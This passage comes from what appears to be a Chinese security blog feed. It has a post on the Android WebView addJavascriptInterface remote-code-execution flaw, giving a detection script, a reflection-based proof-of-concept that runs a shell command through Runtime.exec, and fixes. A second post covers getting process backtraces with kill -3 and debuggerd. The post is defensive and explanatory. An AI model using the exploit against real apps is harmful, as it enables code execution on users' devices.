class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) </span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">window</span>[obj].getClass();</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">check();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p><p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p><h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmd</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.jsinterface.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmd);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">execute([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p><h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p><p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location = yourscheme:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure><p>Google对这个方法的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure><p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;☆-来自-developer-android-com-的信息&quot;&gt;&lt;a href=&quot;#☆-来自-developer-android-com-的信息&quot; class=&quot;headerlink&quot; title=&quot;☆ 来自 developer.android.com 的信息&quot;&gt;</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Android 获取进程的 backtrace 信息</title>
    <link href="http://usmacd.com/2021/11/03/backtrace_in_android/"/>
    <id>http://usmacd.com/2021/11/03/backtrace_in_android/</id>
    <published>2021-11-03T01:56:19.871Z</published>
    <updated>2021-11-03T01:56:19.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="☆-使用kill-发送-SIGNAL-QUIT"><a href="#☆-使用kill-发送-SIGNAL-QUIT" class="headerlink" title="☆ 使用kill 发送 SIGNAL_QUIT"></a>☆ 使用kill 发送 SIGNAL_QUIT</h2><p>这种方法只能用于zygote 的子进程 (比如所有的 app 进程, 都是由zygote fork 而来).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># kill -3 pid</span><br><span class="line"></span><br><span class="line"># cat /data/anr/traces.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">suspend all histogram:  Sum: 290us 99% C.I. 2us-40us Avg: 14.500us Max: 40us</span><br><span class="line">DALVIK THREADS (12):</span><br><span class="line">&quot;Signal Catcher&quot; daemon prio=5 tid=2 Runnable</span><br><span class="line">  | group=&quot;system&quot; sCount=0 dsCount=0 obj=0x32c070a0 self=0xaecca000</span><br><span class="line">  | sysTid=1918 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb4406930</span><br><span class="line">  | state=R schedstat=( 228351607 17443703 83 ) utm=12 stm=9 core=0 HZ=100</span><br><span class="line">  | stack=0xb430a000-0xb430c000 stackSize=1014KB</span><br><span class="line">  | held mutexes= &quot;mutator lock&quot;(shared held)</span><br><span class="line">  native: #00 pc 00370e01  /system/lib/libart.so (_ZN3art15DumpNativeStackERNSt3__113basic_ostreamIcNS0_11char_traitsIcEEEEiPKcPNS_9ArtMethodEPv+160)</span><br><span class="line">  native: #01 pc 0035046f  /system/lib/libart.so (_ZNK3art6Thread4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+150)</span><br><span class="line">  native: #02 pc 0035a373  /system/lib/libart.so (_ZN3art14DumpCheckpoint3RunEPNS_6ThreadE+442)</span><br><span class="line">  native: #03 pc 0035af31  /system/lib/libart.so (_ZN3art10ThreadList13RunCheckpointEPNS_7ClosureE+212)</span><br><span class="line">  native: #04 pc 0035b45f  /system/lib/libart.so (_ZN3art10ThreadList4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+142)</span><br><span class="line">  native: #05 pc 0035bb6f  /system/lib/libart.so (_ZN3art10ThreadList14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+334)</span><br><span class="line">  native: #06 pc 00333cb7  /system/lib/libart.so (_ZN3art7Runtime14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+74)</span><br><span class="line">  native: #07 pc 0033b01d  /system/lib/libart.so (_ZN3art13SignalCatcher13HandleSigQuitEv+928)</span><br><span class="line">  native: #08 pc 0033b901  /system/lib/libart.so (_ZN3art13SignalCatcher3RunEPv+340)</span><br><span class="line">  native: #09 pc 0003f45f  /system/lib/libc.so (_ZL15__pthread_startPv+30)</span><br><span class="line">  native: #10 pc 00019b43  /system/lib/libc.so (__start_thread+6)</span><br><span class="line">  (no managed stack frames)</span><br><span class="line"></span><br><span class="line">&quot;main&quot; prio=5 tid=1 Native</span><br><span class="line">  | group=&quot;main&quot; sCount=1 dsCount=0 obj=0x74abb2a0 self=0xb4d76500</span><br><span class="line">  | sysTid=1914 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb6f3fb34</span><br><span class="line">  | state=S schedstat=( 76934470 21396828 203 ) utm=3 stm=3 core=0 HZ=100</span><br><span class="line">  | stack=0xbe55e000-0xbe560000 stackSize=8MB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  native: #00 pc 00040894  /system/lib/libc.so (__epoll_pwait+20)</span><br><span class="line">  native: #01 pc 00019e6f  /system/lib/libc.so (epoll_pwait+26)</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果写在 /data/anr/traces.txt 文件中, anr 是 ANR(Application Not Response)的意思.</p><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Runtime::InitNonZygoteOrPostFork</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    JNIEnv* env, <span class="keyword">bool</span> is_system_server, NativeBridgeAction action, <span class="keyword">const</span> <span class="keyword">char</span>* isa)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the thread pools.</span></span><br><span class="line">  heap_-&gt;<span class="built_in">CreateThreadPool</span>();</span><br><span class="line">  <span class="comment">// Reset the gc performance data at zygote fork so that the GCs</span></span><br><span class="line">  <span class="comment">// before fork aren&#x27;t attributed to an app.</span></span><br><span class="line">  heap_-&gt;<span class="built_in">ResetGcPerformanceInfo</span>();</span><br><span class="line">  <span class="keyword">if</span> (!is_system_server &amp;&amp;</span><br><span class="line">      !safe_mode_ &amp;&amp;</span><br><span class="line">      (jit_options_-&gt;<span class="built_in">UseJitCompilation</span>() || jit_options_-&gt;<span class="built_in">GetSaveProfilingInfo</span>()) &amp;&amp;</span><br><span class="line">      jit_.<span class="built_in">get</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// Note that when running ART standalone (not zygote, nor zygote fork),</span></span><br><span class="line">    <span class="comment">// the jit may have already been created.</span></span><br><span class="line">    <span class="built_in">CreateJit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">StartSignalCatcher</span>();</span><br><span class="line">  <span class="comment">// Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;,</span></span><br><span class="line">  <span class="comment">// this will pause the runtime, so we probably want this to come last.</span></span><br><span class="line">  Dbg::<span class="built_in">StartJdwp</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出非zygote的进程都会启动 Signal Catcher的 线程.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@shamu:/ # ps -t 2089</span><br><span class="line">USER      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME</span><br><span class="line">u0_a58    2089  386   1565280 53732 SyS_epoll_ b6cb0894 S com.hujiang.dict:pushservice</span><br><span class="line">u0_a58    2092  2089  1565280 53732 do_sigtime b6cb0b68 S Signal Catcher</span><br><span class="line">u0_a58    2095  2089  1565280 53732 unix_strea b6cb194c S JDWP</span><br><span class="line">u0_a58    2096  2089  1565280 53732 futex_wait b6c875e8 S ReferenceQueueD</span><br><span class="line">u0_a58    2097  2089  1565280 53732 futex_wait b6c875e8 S FinalizerDaemon</span><br><span class="line">u0_a58    2099  2089  1565280 53732 futex_wait b6c875e8 S FinalizerWatchd</span><br><span class="line">u0_a58    2100  2089  1565280 53732 futex_wait b6c875e8 S HeapTaskDaemon</span><br><span class="line">u0_a58    2101  2089  1565280 53732 binder_thr b6cb09c0 S Binder_1</span><br><span class="line">u0_a58    2102  2089  1565280 53732 binder_thr b6cb09c0 S Binder_2</span><br><span class="line">u0_a58    2107  2089  1565280 53732 SyS_epoll_ b6cb0894 S Thread-123</span><br><span class="line">u0_a58    2108  2089  1565280 53732 futex_wait b6c875e8 S taskService-pro</span><br><span class="line"></span><br><span class="line">zygote 自己没有该线程.</span><br><span class="line"></span><br><span class="line">root@shamu:/ # ps | grep -i zy</span><br><span class="line">root      386   1     1528448 67416 poll_sched b6cb0a5c S zygote</span><br><span class="line"></span><br><span class="line">127|root@shamu:/ # ps -t 386</span><br><span class="line">USER      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME</span><br><span class="line">root      386   1     1528448 67416 poll_sched b6cb0a5c S zygote</span><br><span class="line">root      2203  386   1528448 67416 futex_wait b6c875e8 S ReferenceQueueD</span><br><span class="line">root      2204  386   1528448 67416 futex_wait b6c875e8 S FinalizerDaemon</span><br><span class="line">root      2205  386   1528448 67416 futex_wait b6c875e8 S FinalizerWatchd</span><br><span class="line">root      2206  386   1528448 67416 futex_wait b6c875e8 S HeapTaskDaemon</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SignalCatcher::Output</span><span class="params">(<span class="keyword">const</span> std::string&amp; s)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (stack_trace_file_.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SignalCatcher::HandleSigQuit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Runtime* runtime = Runtime::<span class="built_in">Current</span>();</span><br><span class="line">  std::ostringstream os;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;\n&quot;</span></span><br><span class="line">      &lt;&lt; <span class="string">&quot;----- pid &quot;</span> &lt;&lt; <span class="built_in">getpid</span>() &lt;&lt; <span class="string">&quot; at &quot;</span> &lt;&lt; <span class="built_in">GetIsoDate</span>() &lt;&lt; <span class="string">&quot; -----\n&quot;</span>;</span><br><span class="line">  <span class="built_in">DumpCmdLine</span>(os);</span><br><span class="line">  <span class="comment">// Note: The strings &quot;Build fingerprint:&quot; and &quot;ABI:&quot; are chosen to match the format used by</span></span><br><span class="line">  <span class="comment">// debuggerd. This allows, for example, the stack tool to work.</span></span><br><span class="line">  std::string fingerprint = runtime-&gt;<span class="built_in">GetFingerprint</span>();</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;Build fingerprint: &#x27;&quot;</span> &lt;&lt; (fingerprint.<span class="built_in">empty</span>() ? <span class="string">&quot;unknown&quot;</span> : fingerprint) &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;ABI: &#x27;&quot;</span> &lt;&lt; <span class="built_in">GetInstructionSetString</span>(runtime-&gt;<span class="built_in">GetInstructionSet</span>()) &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;Build type: &quot;</span> &lt;&lt; (kIsDebugBuild ? <span class="string">&quot;debug&quot;</span> : <span class="string">&quot;optimized&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  runtime-&gt;<span class="built_in">DumpForSigQuit</span>(os);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="literal">false</span>)) &#123;</span><br><span class="line">    std::string maps;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ReadFileToString</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, &amp;maps)) &#123;</span><br><span class="line">      os &lt;&lt; <span class="string">&quot;/proc/self/maps:\n&quot;</span> &lt;&lt; maps;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  os &lt;&lt; <span class="string">&quot;----- end &quot;</span> &lt;&lt; <span class="built_in">getpid</span>() &lt;&lt; <span class="string">&quot; -----\n&quot;</span>;</span><br><span class="line">  <span class="built_in">Output</span>(os.<span class="built_in">str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> signal_number = signal_catcher-&gt;<span class="built_in">WaitForSignal</span>(self, signals);</span><br><span class="line">    <span class="keyword">if</span> (signal_catcher-&gt;<span class="built_in">ShouldHalt</span>()) &#123;</span><br><span class="line">      runtime-&gt;<span class="built_in">DetachCurrentThread</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (signal_number) &#123;</span><br><span class="line">    <span class="keyword">case</span> SIGQUIT:</span><br><span class="line">      signal_catcher-&gt;<span class="built_in">HandleSigQuit</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SIGUSR1:</span><br><span class="line">      signal_catcher-&gt;<span class="built_in">HandleSigUsr1</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">LOG</span>(ERROR) &lt;&lt; <span class="string">&quot;Unexpected signal %d&quot;</span> &lt;&lt; signal_number;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从源码中发现除了SIGQUIT 还可以发送 SIGUSR1 , 这个信号可以使进程java 虚拟机执行GC<br>操作 <code>kill -10 pid</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SignalCatcher::HandleSigUsr1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;SIGUSR1 forcing GC (no HPROF)&quot;</span>;</span><br><span class="line">  Runtime::<span class="built_in">Current</span>()-&gt;<span class="built_in">GetHeap</span>()-&gt;<span class="built_in">CollectGarbage</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="☆-使用-debugged-命令行"><a href="#☆-使用-debugged-命令行" class="headerlink" title="☆ 使用 debugged 命令行"></a>☆ 使用 debugged 命令行</h2><p>这种方法是全系统通用的, 可以用于非zygote的进程.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage: -b [&lt;tid&gt;]</span><br><span class="line">  -b dump backtrace to console, otherwise dump full tombstone file</span><br></pre></td></tr></table></figure><p>通过 -b 参数指定进程pid, 即可.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># debuggerd -b 23850</span><br><span class="line"></span><br><span class="line">Sending request to dump task 23850.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----- pid 23850 at 1970-01-27 03:57:11 -----</span><br><span class="line">Cmd line: /sbin/adbd</span><br><span class="line">ABI: &#x27;arm&#x27;</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23850</span><br><span class="line">  #00 pc 0002b158  /sbin/adbd</span><br><span class="line">  #01 pc 0002467f  /sbin/adbd</span><br><span class="line">  #02 pc 00020854  [stack]</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23851</span><br><span class="line">  #00 pc 0002fd38  /sbin/adbd</span><br><span class="line">  #01 pc 0002a501  /sbin/adbd</span><br><span class="line">  #02 pc 0000000b  &lt;unknown&gt;</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23852</span><br><span class="line">  #00 pc 0002b624  /sbin/adbd</span><br><span class="line">  #01 pc 000106cf  /sbin/adbd</span><br><span class="line">  #02 pc 00010301  